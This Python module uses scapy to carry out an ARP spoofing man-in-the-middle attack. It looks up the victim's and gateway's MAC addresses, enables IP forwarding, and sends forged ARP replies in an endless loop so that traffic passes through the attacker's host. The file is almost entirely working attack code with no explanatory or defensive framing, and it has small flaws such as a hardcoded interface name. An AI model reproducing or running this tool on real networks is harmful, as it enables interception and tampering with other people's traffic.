import os
import re
from scapy.all import *
from time import sleep
from subprocess import Popen, PIPE


def getHostMacAddr(iface):
    with open('/sys/class/net/{}/address'.format(iface)) as f:
        mac = f.read()
        return mac.rstrip()


def getMacAddrFromIP(ip):
    response = os.system("ping -c 1 {}".format(ip))
    if(response == 0):
        cmd1 = Popen(['arp', '-a', ip], stdout=PIPE)
        cmd2 = Popen(['awk', '{print $4}'], stdin=cmd1.stdout, stdout=PIPE)
        mac = cmd2.communicate()[0].rstrip()
        return mac
    else:
        exit("Could not establish connection to {}. Exiting...".format(ip))


def getRouterInfo():
    cmd1 = Popen(['arp', '-a'], stdout=PIPE)
    cmd2 = Popen(['awk', '/gateway/ {print $2}'], stdin=cmd1.stdout, stdout=PIPE)
    cmd3 = Popen(['awk', '/gateway/ {print $4}'], stdin=cmd1.stdout, stdout=PIPE)
    routerIP = re.sub('[\(\)\{\}<>]', '', cmd2.communicate()[0])
    routerMAC = cmd3.communicate()[0].rstrip()
    return (routerIP, routerMAC)


def ArpPoison(victimIP, routerIP, iface):
    if(routerIP is None):
        routerIP, routerMAC = getRouterInfo()
    else:
        routerMAC = getMacAddrFromIP(routerIP)
    victimMAC = getMacAddrFromIP(victimIP)
    hostMAC = getHostMacAddr("eno1")

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    while 1:
        sendp(Ether(src=hostMAC, dst=victimMAC)/ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
        sendp(Ether(src=hostMAC, dst=routerMAC)/ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
        sleep(2)


def main():
    exit("Please run spoof.py")


if __name__ == '__main__':
    main()
